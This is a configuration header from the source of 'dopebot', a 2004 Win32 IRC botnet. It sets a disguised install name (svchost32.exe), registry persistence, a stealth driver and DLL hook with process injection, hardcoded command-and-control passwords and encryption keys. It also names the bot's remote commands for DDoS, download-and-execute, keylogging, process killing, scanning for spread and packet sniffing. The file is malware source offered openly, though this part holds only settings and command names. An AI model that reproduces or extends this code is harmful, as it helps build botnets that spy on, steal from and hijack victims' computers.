/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

//Serverlist Struct
typedef struct serverlist
{
	char *server;
	int port;
} serverlist;
/*-------------------------------------------------------------------------------*/
//Non Crypted Config
#ifdef NO_CRYPTO
//Non Crypted Settings
//Bot Settings
	const char *botname = "d0pebot|";
	const char *botversion = "d0pebot 0.22 by dope.";
	const char *prefix = ".";
	const char *version = "mIRC v6.17 Khaled Mardam-Bey";
	const int maxrand = 5;
	const bool uptimenick = TRUE;
//Daemon Settings
	const char *ftpduser = "dopebot";
	const char *ftpdpass = "dopebot";
	const int ftpdport = 21;
	const int tftpdport = 69;
//Install Settings
	const char *filename = "svchost32.exe";
	const char *regkeyname = "svchost32";
	const char *servicename = "svchost32";
	const bool useregistry = TRUE;
	const bool useservice = FALSE;
//IRC Settings
	serverlist servers[] =
	{
		{"x.x.x", 6667},
		{"x.x.x", 6667},
		{NULL, 0}
	};
	const char *serverpassword = "d0pe";
	const char *channel = "";
	const char *channelpassword = "d0pe";
	const bool useoschannel = FALSE;
//Security Settings
	const char *botpassword = "d0pe";
	const char *hostauth[] =
	{
		"g7onic!",
		"\0"
	};
	const char *teakey = "jbegtnab";
	const int xorkey = 3;
//Sniffer Settings
	const char *snifferchannel = "";
//Spreader Settings
	const char *exploitchannel = "";
//Stealth Settings
	const char *driverfilename = "msdirectx.sys";
	const char *drivername = "msdirectx";
	const char *hookfilename = "msdirectx.dll";
	const char *injectprocess = "notepad.exe";
	const int ircport = 6667; //Used with regport()
/*-------------------------------------------------------------------------------*/
//Non Crypted Commands
//Bot Command Names
	const char *cmd_botgroup = "main"; //Name Of Bot Command Group
////
	const char *cmd_botdisconnect = "main.disconnect"; //Name Of Bot Disconnect Command
	const char *cmd_botinfo = "main.info"; //Name Of Bot Info Command
	const char *cmd_botlog = "main.log"; //Name Of Bot Log Command
	const char *cmd_botlogin = "main.login"; //Name Of Bot Login Command
	const char *cmd_botlogout = "main.logout"; //Name Of Bot Logout Command
	const char *cmd_botnetinfo = "main.netinfo"; //Name Of Bot Network Info Command
	const char *cmd_botraw = "main.raw"; //Name Of Bot RAW Command
	const char *cmd_botremove = "main.remove"; //Name Of Bot Remove Command
	const char *cmd_botsysinfo = "main.sysinfo"; //Name Of Bot System Info Command
//DDOS Command Names
	const char *cmd_ddosgroup = "dd0s"; //Name Of DDOS Command Group
////
	const char *cmd_ddosbandwith = "dd0s.bandwith"; //Name Of DDOS Bandwith Command
//Download Command Names
	const char *cmd_downloadgroup = "downl"; //Name Of Download Command Group
////
	const char *cmd_downloadhttp = "downl.http"; //Name Of Download HTTP Command
	const char *cmd_downloadupdate = "downl.update"; //Name Of Download Update Command
//File Command Names
	const char *cmd_filegroup = "f1le"; //Name Of File Command Group
////
	const char *cmd_filedelete = "f1le.delete"; //Name Of File Delete Command
	const char *cmd_fileexecute = "f1le.execute"; //Name Of File Execute Command
	const char *cmd_fileopen = "f1le.open"; //Name Of File Open Command
//Keylogger Command Names
	const char *cmd_klggroup = "ke7log"; //Name Of KeyLog Command Group
////
	const char *cmd_klgstart = "ke7log.start"; //Name Of KeyLog Start Command
	const char *cmd_klgstop = "ke7log.stop"; //Name Of KeyLog Stop Command
//Process Command Names
	const char *cmd_processgroup = "proc3ss"; //Name Of Process Command Group
////
	const char *cmd_processlist = "proc3ss.list"; //Name Of Process List Command
	const char *cmd_processkill = "proc3ss.kill"; //Name Of Process Kill Command
//Scan Command Names
	const char *cmd_scangroup = "sc4n"; //Name Of Scan Command Group
////
	const char *cmd_scancip = "sc4n.cip"; //Name Of Scan CIP Command
	const char *cmd_scanstart = "sc4n.start";//Name Of Scan Start Command
	const char *cmd_scanstop = "sc4n.stop"; //Name Of Scan Stop Command
//Sniffer Command Names
	const char *cmd_sniffgroup = "sn1ff"; //Name Of Sniff Command Group
////
	const char *cmd_snifferstart = "sn1ff.start"; //Name Of Sniffer Start Command
	const char *cmd_snifferstop = "sn1ff.stop"; //Name Of Sniffer Stop Command
#endif
/*-------------------------------------------------------------------------------*/

/*
		.=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-.
		|                     ______                     |
		|                  .-"      "-.                  |
		|                 /            \                 |
		|     _          |              |          _     |
		|    ( \         |,  .-.  .-.  ,|         / )    |
		|     > "=._     | )(__/  \__)( |     _.=" <     |
		|    (_/"=._"=._ |/     /\     \| _.="_.="\_)    |
		|           "=._"(_     ^^     _)"_.="           |
		|               "=\__|IIIIII|__/="               |
		|              _.="| \IIIIII/ |"=._              |
		|    _     _.="_.="\          /"=._"=._     _    |
		|   ( \_.="_.="     `--------`     "=._"=._/ )   |
		|    > _.="                            "=._ <    |
		|   (_/                                    \_)   |
		|                                                |
		'-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-='
*/
